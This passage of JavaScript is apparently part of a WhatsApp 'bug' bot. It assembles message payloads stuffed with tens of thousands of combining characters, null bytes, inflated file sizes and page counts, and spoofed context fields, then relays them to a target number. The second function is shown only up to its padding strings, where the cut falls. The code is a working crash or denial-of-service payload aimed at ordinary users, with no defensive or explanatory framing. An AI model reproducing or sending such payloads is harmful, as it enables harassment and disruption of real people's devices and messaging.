̷⃨ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗ⃛".repeat(3) + "ꦾ".repeat(27777),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: conn.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "༿༑ᜳ⁑⃟𝗥𝗔༽𝗟𝗗𝗭𝗭͢𑲭͠𝗫꙰༽𝗬𝗭​᭄̬͠͠ᢶ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "Persetan Dengan Cinta, Hidup Dalam Kegelapan.",
                },
                contentText: '༿༑ᜳ⁑⃟𝗥𝗔༽𝗟𝗗𝗭𝗭͢𑲭͠𝗫꙰༽𝗬𝗭​᭄̬͠͠ᢶ',
                footerText: "",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(55000),
                    buttonText: {
                      displayText: "\u0007",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: { url: 'https://files.catbox.moe/w1isit.jpg' },
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/RaldzzXyz",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! P',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: { url: 'https://files.catbox.moe/w1isit.jpg' },
              sourceUrl: "Tetaplah Menjadi Bodoh...",
              sourceId: "x - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `${"أ".repeat(100)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "X",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await conn.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
				
async function Raldz4(target, ptcp = true) {
  const jids = `ꦾ`.repeat(27050);
  const ui = '꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨ